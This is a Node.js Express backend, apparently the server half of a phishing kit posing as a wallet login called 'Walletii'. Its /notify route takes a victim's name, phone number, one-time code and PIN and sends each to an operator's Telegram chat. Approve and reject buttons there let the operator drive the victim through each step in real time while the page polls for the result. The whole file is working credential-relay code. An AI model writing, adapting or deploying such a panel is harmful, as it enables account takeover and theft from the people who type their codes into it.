'use strict';

import express           from 'express';
import cors              from 'cors';
import crypto            from 'crypto';
import { fileURLToPath } from 'url';
import path              from 'path';
import config            from './config.js';
import { setResult, popResult, setSession, getSession } from './store.js';
import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

app.use(express.json());
app.use(cors({
  origin:         true,
  methods:        ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}));

app.use(express.static(__dirname));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'walletii-backend', ts: new Date().toISOString() });
});

app.get('/setup', async (_req, res) => {
  try {
    const result = await registerWebhook();
    if (result.ok) {
      res.json({
        ok:          true,
        description: result.description,
        webhook:     `${config.serverUrl}/webhook`,
        message:     '✅ Webhook registered successfully! You can now use the app.',
      });
    } else {
      res.status(500).json({ ok: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ════════════════════════════════════════════════════════
//  POST /notify
//
//  type = 'login'    → sends Name, Phone, Date & Time + [✅ Continue to OTP] [❌ Invalid Number]
//  type = 'otp'      → sends Name, Phone, OTP entered  + [✅ Continue to PIN] [❌ Wrong Code]
//  type = 'passcode' → sends Name, Phone, PIN entered  + [✅ Approved]        [❌ Wrong PIN]
//  type = 'resend'   → informational notification, no polling
// ════════════════════════════════════════════════════════
app.post('/notify', async (req, res) => {
  const { type, phone, countryCode, otp, passcode, name } = req.body;

  if (!type || !phone) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const fullPhone = `${countryCode || ''} ${phone}`.trim();

  // ── Resend: just send a notification, no polling needed ──
  if (type === 'resend') {
    const now  = new Date();
    const text = `🔄 *Resend Code Requested*\n\n`
               + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
               + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
               + `🕐 *Time:* ${escMd(now.toLocaleString('en-GB', { dateStyle:'medium', timeStyle:'short' }))}\n\n`
               + `User has requested a new OTP code\\.`;
    const tgResult = await sendAdminMessage(text, []);
    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error' });
    }
    return res.json({ ok: true });
  }

  // ── Generate token + HMAC ──
  const token = crypto.randomBytes(8).toString('hex');
  const sig   = crypto.createHmac('sha256', config.secretKey)
                      .update(`${token}|${phone}`)
                      .digest('hex');

  setSession(token, phone, sig, config.tokenTtl);

  const cbData = (action) => `${action}|${token}`;

  try {
    let text, keyboard;

    const now      = new Date();
    const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });

    if (type === 'login') {
      text = `🔔 *New Login Alert*\n\n`
           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
           + `Awaiting your decision\\.`;

      keyboard = [[
        { text: '✅ Continue to OTP',  callback_data: cbData('send_otp')       },
        { text: '❌ Invalid Number',   callback_data: cbData('invalid_number')  },
      ]];

    } else if (type === 'otp') {
      if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });

      text = `🔐 *OTP Submitted*\n\n`
           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🔑 *OTP Entered:* \`${escMd(otp)}\`\n\n`
           + `Awaiting your decision\\.`;

      keyboard = [[
        { text: '✅ Continue to PIN', callback_data: cbData('otp_ok')    },
        { text: '❌ Wrong Code',      callback_data: cbData('otp_wrong') },
      ]];

    } else if (type === 'passcode') {
      if (!passcode) return res.status(400).json({ ok: false, error: 'Missing passcode' });

      text = `🔒 *Passcode Submitted*\n\n`
           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🔢 *PIN Entered:* \`${escMd(passcode)}\`\n\n`
           + `Awaiting your decision\\.`;

      keyboard = [[
        { text: '✅ Approved',  callback_data: cbData('passcode_ok')    },
        { text: '❌ Wrong PIN', callback_data: cbData('passcode_wrong') },
      ]];

    } else {
      return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);

    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
    }

    res.json({ ok: true, token });

  } catch (err) {
    console.error('Error in /notify:', err);
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// ════════════════════════════════════════════════════════
//  POST /poll
// ════════════════════════════════════════════════════════
app.post('/poll', (req, res) => {
  const { token } = req.body;

  if (!token || !/^[a-f0-9]{16}$/.test(token)) {
    return res.status(400).json({ ok: false, error: 'Invalid token' });
  }

  const result = popResult(token);

  if (result === null) {
    return res.json({ ok: true, result: 'pending' });
  }

  res.json({ ok: true, result });
});

// ════════════════════════════════════════════════════════
//  POST /webhook  — Telegram button handler
// ════════════════════════════════════════════════════════
app.post('/webhook', async (req, res) => {
  res.json({ ok: true });

  const update = req.body;
  if (!update?.callback_query) return;

  const cb     = update.callback_query;
  const cbId   = cb.id;
  const data   = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId  = cb.message?.message_id;

  if (chatId !== config.adminChatId.toString()) {
    await answerCallback(cbId, '⛔ Not authorised', true);
    return;
  }

  const parts = data.split('|');
  if (parts.length !== 2) {
    await answerCallback(cbId, '⚠️ Invalid data');
    return;
  }

  const [action, token] = parts;

  const session = getSession(token);
  if (!session) {
    await answerCallback(cbId, '⚠️ Session expired or not found', true);
    return;
  }

  const expectedSig = crypto.createHmac('sha256', config.secretKey)
                            .update(`${token}|${session.phone}`)
                            .digest('hex');

  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) {
    await answerCallback(cbId, '⚠️ Invalid signature', true);
    return;
  }

  try {
    switch (action) {

      case 'send_otp':
        setResult(token, 'otp_allowed', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Approved*\nUser \`${escMd(session.phone)}\` may now enter their OTP code\\.`, []);
        await answerCallback(cbId, '✅ Continuing to OTP');
        break;

      case 'invalid_number':
        setResult(token, 'invalid_number', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Invalid Number*\nUser \`${escMd(session.phone)}\` has been notified\\.`, []);
        await answerCallback(cbId, '❌ Invalid number sent to user');
        break;

      case 'otp_ok':
        setResult(token, 'otp_correct', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *OTP Accepted*\nUser \`${escMd(session.phone)}\` may now enter their PIN\\.`, []);
        await answerCallback(cbId, '✅ Continuing to PIN');
        break;

      case 'otp_wrong':
        setResult(token, 'otp_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong Code*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their OTP\\.`, []);
        await answerCallback(cbId, '❌ Wrong code sent to user');
        break;

      case 'passcode_ok':
        setResult(token, 'passcode_correct', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`✅ *Passcode Approved*\nUser \`${escMd(session.phone)}\` has been granted access\\.`, []);
        await answerCallback(cbId, '✅ User approved');
        break;

      case 'passcode_wrong':
        setResult(token, 'passcode_wrong', config.tokenTtl);
        await removeButtons(chatId, msgId);
        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their passcode\\.`, []);
        await answerCallback(cbId, '❌ Wrong PIN sent to user');
        break;

      default:
        await answerCallback(cbId, '⚠️ Unknown action');
    }
  } catch (err) {
    console.error('Webhook handler error:', err);
  }
});

// ════ DEBUG ROUTE ════
app.get('/test', async (_req, res) => {
  const result = await sendAdminMessage('🧪 Test message from Walletii\\.', []);
  res.json({
    telegramResponse: result,
    adminChatId:      config.adminChatId,
    serverUrl:        config.serverUrl,
    botTokenPreview:  config.botToken ? config.botToken.slice(0, 10) + '...' : 'MISSING',
    secretKeySet:     !!config.secretKey,
  });
});

app.listen(config.port, () => {
  console.log(`\n🚀 Walletii backend running on port ${config.port}`);
  console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
  console.log(`   Setup URL:   ${config.serverUrl}/setup`);
  console.log(`   Health:      ${config.serverUrl}/health\n`);
});
